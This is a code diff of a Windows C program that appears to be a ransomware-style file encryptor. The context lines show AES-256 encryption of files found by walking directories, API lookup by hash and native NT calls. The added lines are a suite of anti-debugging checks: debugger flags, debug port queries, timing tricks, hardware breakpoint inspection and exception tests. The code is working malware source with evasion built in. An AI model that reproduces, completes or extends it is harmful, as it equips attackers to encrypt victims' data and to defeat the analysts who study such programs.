@@ -1,12 +1,10 @@
 #include<windows.h>
 #include <strsafe.h>
-#include<wincrypt.h>
 #include"aes.h"
 #include"commonEnc.h"
 #include <stdio.h>
 
 #pragma comment(lib,"advapi32.lib");
-#pragma comment(lib, "Crypt32.lib")
 
 
 #define AES_256_KEY_SIZE  32 
@@ -152,7 +150,6 @@ BOOL LoadNativeFunctions(PUNICODE_STRING ufileName,LPCWSTR path, OBJECT_ATTRIBUT
 		(RtlInitUnicodeStringFunc)GetProcAddressH(hNtdll, "RtlInitUnicodeString");
 	if (!pRtlInitUnicodeString) return FALSE;
 
-	// Use the function
 	WCHAR fullPath[MAX_PATH];
 	if (wcsncmp(path, L"\\??\\", 4) != 0) {
 		wcscpy_s(fullPath, MAX_PATH, L"\\??\\");
@@ -163,7 +160,6 @@ BOOL LoadNativeFunctions(PUNICODE_STRING ufileName,LPCWSTR path, OBJECT_ATTRIBUT
 	}
 	pRtlInitUnicodeString(ufileName, fullPath);
 
-	// Create object attributes
 	objAttr->Length = sizeof(OBJECT_ATTRIBUTES);
 	objAttr->RootDirectory = NULL;
 	objAttr->ObjectName = ufileName;
@@ -632,7 +628,7 @@ BOOL DirectoryFiles(WCHAR* pDirectoryPath,uint8_t* key, uint8_t* iv) {
 			continue;
 		}
 		StringCchCopy(filePath, MAX_PATH * sizeof(WCHAR), pDirectoryPath);
-		StringCchCat(filePath, MAX_PATH * sizeof(WCHAR), L"\\");  // Fix here
+		StringCchCat(filePath, MAX_PATH * sizeof(WCHAR), L"\\");  
 		StringCchCat(filePath, MAX_PATH * sizeof(WCHAR), fileData.cFileName);
 
 
@@ -855,3 +851,139 @@ _EndFucntion:
 
 	return result;
 }
+
+
+
+BOOL CheckIsDebuggerPresent() {
+	if (IsDebuggerPresent()) {
+		printf("Debugger detected using IsDebuggerPresent()\n");
+		return TRUE;
+	}
+	printf("No debugger detected using IsDebuggerPresent()\n");
+	return FALSE;
+}
+
+BOOL CheckRemoteDebugger() {
+	BOOL isDebuggerPresent = FALSE;
+	CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);
+
+	if (isDebuggerPresent) {
+		printf("Remote debugger detected\n");
+		return TRUE;
+	}
+	printf("No remote debugger detected\n");
+	return FALSE;
+}
+
+BOOL CheckProcessDebugFlags() {
+	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+	if (!hNtdll) return FALSE;
+
+	pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)
+		GetProcAddress(hNtdll, "NtQueryInformationProcess");
+
+	if (!NtQueryInformationProcess) return FALSE;
+
+	DWORD processDebugFlags = 0;
+	NTSTATUS status = NtQueryInformationProcess(
+		GetCurrentProcess(),
+		31, 
+		&processDebugFlags,
+		sizeof(DWORD),
+		NULL
+	);
+
+	if (NT_SUCCESS(status) && processDebugFlags == 0) {
+		printf("Debugger detected using ProcessDebugFlags\n");
+		return TRUE;
+	}
+	printf("No debugger detected using ProcessDebugFlags\n");
+	return FALSE;
+}
+
+BOOL CheckProcessDebugPort() {
+	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+	if (!hNtdll) return FALSE;
+
+	pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)
+		GetProcAddress(hNtdll, "NtQueryInformationProcess");
+
+	if (!NtQueryInformationProcess) return FALSE;
+
+
+	DWORD_PTR debugPort = 0;
+	NTSTATUS status = NtQueryInformationProcess(
+		GetCurrentProcess(),
+		7, 
+		&debugPort,
+		sizeof(DWORD_PTR),
+		NULL
+	);
+
+	if (NT_SUCCESS(status) && debugPort != 0) {
+		printf("Debugger detected using ProcessDebugPort\n");
+		return TRUE;
+	}
+	printf("No debugger detected using ProcessDebugPort\n");
+	return FALSE;
+}
+
+BOOL CheckTimingAnomaly() {
+	LARGE_INTEGER frequency, start, end;
+	DWORD timeElapsed;
+
+	QueryPerformanceFrequency(&frequency);
+	QueryPerformanceCounter(&start);
+
+	for (int i = 0; i < 1000; i++) {
+		GetTickCount();
+	}
+
+	QueryPerformanceCounter(&end);
+
+	timeElapsed = (DWORD)((end.QuadPart - start.QuadPart) * 1000 / frequency.QuadPart);
+
+	if (timeElapsed > 10) { 
+		printf("Possible debugger detected: Execution took %d ms\n", timeElapsed);
+		return TRUE;
+	}
+	printf("No timing anomaly detected: Execution took %d ms\n", timeElapsed);
+	return FALSE;
+}
+
+BOOL CheckHardwareBreakpoints() {
+	BOOL result = FALSE;
+	CONTEXT ctx = { 0 };
+	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+	if (GetThreadContext(GetCurrentThread(), &ctx)) {
+		if (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0) {
+			printf("Hardware breakpoints detected\n");
+			result = TRUE;
+		}
+		else {
+			printf("No hardware breakpoints detected\n");
+		}
+	}
+
+	return result;
+}
+
+BOOL CheckUsingExceptions() {
+	BOOL debuggerDetected = FALSE;
+
+	SetUnhandledExceptionFilter(myAntiDebugExceptionHandler);
+
+	__try {
+		__debugbreak(); 
+
+		printf("Debugger detected using exceptions\n");
+		debuggerDetected = TRUE;
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER) {
+		printf("No debugger detected using exceptions\n");
+	}
+
+	return debuggerDetected;
+}
+
